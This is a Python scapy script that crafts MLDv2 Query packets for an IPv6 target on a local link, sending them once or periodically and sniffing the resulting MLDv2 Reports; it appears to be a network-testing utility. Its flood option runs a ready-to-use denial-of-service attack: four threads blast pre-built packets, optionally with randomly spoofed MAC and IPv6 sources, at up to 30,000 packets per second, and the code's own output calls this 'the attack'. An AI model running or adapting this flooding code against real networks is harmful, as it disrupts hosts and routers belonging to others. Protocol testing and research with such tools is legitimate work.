#!/usr/bin/python3
import argparse
import logging
import multiprocessing
import random
import sys
import threading
from collections import Counter
import netifaces
import netifaces as ni
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6MLQuery2, ICMPv6MLReport2, \
    ICMPv6MLDMultAddrRec
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, srp1, srp, sniff
from validate_parameters import is_valid_ipv6, mac2ipv6, convert_mld
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_num


def parameter():
    parser = argparse.ArgumentParser(description="Sending MLDv2 Query message(s) to a target, with option to send "
                                                 "periodically or flood. It is recommended by RFC 3810 to use "
                                                 "link-local addresses since global addresses might be ignored when "
                                                 "processing MLDv2 messages.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-mip", dest="multicast_ip", action="store", help="the interested multicast "
                                                                          "address to nodes (set to :: "
                                                                          "if skipping)")
    parser.add_argument("-src", dest="src", action="store", nargs="+", default=[],
                        help="the IPv6 address of source(s) (separated by space if more than 1)")
    parser.add_argument("-mrc", dest="max_response", action="store", type=int, default=1000,
                        help="the maximum response code (time)")
    parser.add_argument("-S", dest="s_flag", action="store_true", default=False, help="allow Suppress Router-Side "
                                                                                      "Processing (set to 0 if "
                                                                                      "skipping). If not enabled, "
                                                                                      "when a host sends an MLDv2 "
                                                                                      "Report message to a router to "
                                                                                      "join a multicast group, "
                                                                                      "the router responds with MLDv2 "
                                                                                      "Query messages to determine "
                                                                                      "the active listeners in the "
                                                                                      "group")
    parser.add_argument("-qrv", dest="qrv", action="store", type=int, default=2,
                        help="define the Querier's Robustness Value (set to  if skipping). It specifies how many "
                             "queries it can miss before taking up the role of querier")
    parser.add_argument("-qqic", dest="qqic", action="store", type=int, default=125,
                        help="specify the Querier's query interval code (set to 125 if skipping). It is calculated in "
                             "the units of 1/4 second")
    parser.add_argument("-p", dest="period", action="store", type=int,
                        help="send the MLDv2 Query periodically every specified seconds")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending MLDv2 Query messages using only the defined "
                             "source addresses (constant), or sending MLDv2 Query messages with many random source "
                             "addresses (random)")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        length = len(ni.ifaddresses(args.interface)[ni.AF_INET6])
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][length - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::1"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the multicast IPv6 address
    if args.multicast_ip is None:
        args.multicast_ip = "::"
    if args.multicast_ip is not None:
        if not is_valid_ipv6(args.multicast_ip):
            print("---> The given multicast address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the sources
    if args.src is None:
        args.src = []
    if args.src is not None:
        for i in range(len(args.src)):
            if not is_valid_ipv6(args.src[i]):
                print("---> The given IPv6 address of source(s) is invalid. Try again!!!")
                sys.exit(1)

    # Validate the maximum response code
    if args.max_response is not None:
        if not is_valid_num(args.max_response):
            print("---> The given maximum response code is invalid. Try again!!!")
            sys.exit(1)

    # Validate the S flag
    if not args.s_flag:
        args.s_flag = 0
    if args.s_flag:
        args.s_flag = 1

    # Validate the QRV
    if args.qrv:
        if 0 >= args.qrv or args.qrv > 7:
            print("---> The given QRV is invalid. Try again!!!")
            sys.exit(1)

    # Validate the QQIC
    if args.qqic:
        if 0 > args.qqic or args.qqic > 255:
            print("---> The given QQIC is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.source_mac, args.source_ip, args.destination_ip, args.multicast_ip, args.src, args.max_response, args.s_flag, args.qrv, args.qqic, args.period, args.flood


def generate(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood):
    # Generate packet
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
    HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
    MLD = ICMPv6MLQuery2(type=130, mladdr=multicast_ip, sources=src, mrd=max_response, S=s_flag, QRV=qrv, QQIC=qqic)
    packet1 = Ether(src=source_mac) / layer3 / HBH / MLD
    if period is None and flood is None:
        if destination_ip == "ff02::1" and multicast_ip == "::" and src == []:
            print("Sending MLDv2 General Query message to the destination: ", destination_ip)
        if destination_ip != "ff02::1" and src == []:
            print("Sending MLDv2 Multicast Address Specific Query message to the destination: ", destination_ip)
        if src != []:
            print("Sending MLDv2 Multicast Address and Source Specific Query message to the destination: ",
                  destination_ip)
        sendp(packet1, verbose=False, iface=interface)

    if period is not None:
        if destination_ip == "ff02::1" and multicast_ip == "::" and src == []:
            print("Sending MLDv2 General Query message every " + str(period) + " second(s) to the destination: ",
                  destination_ip + " (press Ctrl+C to stop the process).....")
        if destination_ip != "ff02::1" and src == []:
            print("Sending MLDv2 Multicast Address Specific Query message every " + str(
                period) + " second(s) to the destination: ",
                  destination_ip + " (press Ctrl+C to stop the process).....")
        if src != []:
            print("Sending MLDv2 Multicast Address and Source Specific Query message every " + str(
                period) + " second(s) to the destination: ",
                  destination_ip + " (press Ctrl+C to stop the process).....")
        sendp(packet1, verbose=False, iface=interface, inter=period, loop=1)
    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + " with MLDv2 Query messages (press Ctrl+C to stop the "
                                                              "attack).....")
        if flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)

        if flood == "random":
            for i in range(150):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:01")
                layer3 = IPv6(src=source_ip, dst=destination_ip)
                HBH = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
                MLD = ICMPv6MLQuery2(type=130, mladdr=multicast_ip, sources=src, mrd=max_response)
                packet1 = layer2 / layer3 / HBH / MLD
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, max_response):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if ICMPv6MLReport2 in packet:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
            print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
            for i in range(packet[0][ICMPv6MLReport2].records_number):
                print("     Record number " + str(i + 1) + ": " + convert_mld(
                    packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                      packet[0][ICMPv6MLDMultAddrRec][i].dst)
                print("             Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
            print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=max_response)
    except KeyboardInterrupt:
        sys.exit(0)


def sniffing_forever(interface):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if ICMPv6MLReport2 in packet:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            print("+ Received MLDv2 Report message number #" + str(sum(packet_counts.values())))
            print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
            for i in range(packet[0][ICMPv6MLReport2].records_number):
                print("     Record number " + str(i + 1) + ": " + convert_mld(
                    packet[0][ICMPv6MLDMultAddrRec][i].rtype) + " and multicast address: " +
                      packet[0][ICMPv6MLDMultAddrRec][i].dst)
                print("             Sources: " + str(packet[0][ICMPv6MLDMultAddrRec][i].sources))
            print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, max_response])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


def execute_functions_forever(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood):
    p1 = multiprocessing.Process(target=generate,
                                 args=[interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood])
    p2 = multiprocessing.Process(target=sniffing_forever, args=[interface])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood = parameter()
    if flood is None and period is None:
        try:
            execute_functions(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    elif period is not None:
        try:
            execute_functions_forever(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, source_ip, destination_ip, multicast_ip, src, max_response, s_flag, qrv, qqic, period, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
